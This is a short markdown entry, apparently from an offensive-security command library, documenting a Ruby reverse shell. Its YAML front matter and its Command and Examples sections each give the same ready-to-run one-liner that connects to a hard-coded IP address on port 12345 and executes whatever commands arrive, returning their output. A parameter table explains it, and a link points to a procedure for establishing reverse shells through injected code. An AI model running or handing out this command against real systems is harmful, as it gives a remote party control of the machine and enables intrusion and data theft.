---
data: >-
  ruby -rsocket -e exit if
  fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print
  io.read}end
tags:
  - reverse-shell
type: command
executor: bash
platforms:
  - Linux
id: d4066a69-4427-4b78-89b6-10fe2b3a3c43
created_at: '2025-12-11T03:47:58.157Z'
updated_at: '2025-12-11T03:47:58.157Z'
verified: false
validated: true
submitted: true
---
# ruby-reverse-shell

## Command

```bash
ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

## Description

Spawns a reverse shell using Ruby, connecting to a specified IP and port, executing received commands.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-rsocket` | Requires socket library | Yes |
| `-e` | Executes the code | Yes |
| `TCPSocket.new("103.3.61.137",12345)` | Connects to IP:port | Yes |

## Examples

### Basic Usage

```bash
ruby -rsocket -e exit if fork;c=TCPSocket.new("103.3.61.137",12345);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end
```

## Expected Output

Establishes a reverse shell connection.

## Related

- [[procedures/Establish-Reverse-Shell-via-Injected-Code]]
- [[tools/Ruby]]
